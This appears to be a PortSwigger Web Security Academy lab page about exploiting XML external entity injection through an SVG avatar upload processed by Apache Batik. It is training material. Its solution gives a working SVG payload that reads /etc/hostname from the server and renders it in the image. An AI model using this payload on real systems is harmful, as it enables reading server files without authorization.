# Lab: Exploiting XXE via image file upload

Source: https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload
Fetched: 2026-06-28T09:18:06.907102+00:00

Web Security Academy

XXE injection

Lab

Lab: Exploiting XXE via image file upload

This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.

To solve the lab, upload an image that displays the contents of the /etc/hostname file after processing. Then use the "Submit solution" button to submit the value of the server hostname.

Hint

The SVG image format uses XML.

Solution

Create a local SVG image with the following content:

<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>

Post a comment on a blog post, and upload this image as an avatar.

When you view your comment, you should see the contents of the /etc/hostname file in your image. Use the "Submit solution" button to submit the value of the server hostname.

Community solutions

Garr_7

Intigriti

Michael Sommer (no audio)

Find XSS vulnerabilities using Burp Suite

Try for free
